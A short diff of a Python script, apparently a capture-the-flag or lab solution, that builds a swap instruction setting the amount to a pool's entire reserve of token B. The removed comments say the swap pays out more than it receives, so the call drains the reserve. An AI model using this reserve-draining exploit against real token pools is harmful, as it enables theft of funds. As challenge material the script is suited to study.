@@ -29,8 +29,6 @@ def main():
         elif k == "reserve_b":
             reserve_b = int(v)
 
-    # the swap pays out `amount` of B while only receiving amount-fee of A: drain the reserve
-    # SwapAToB { amount } -> borsh variant 1 + u64
     ix_data = bytes([1]) + reserve_b.to_bytes(8, "little")
     metas = [
         ("r", addr["pool"]),
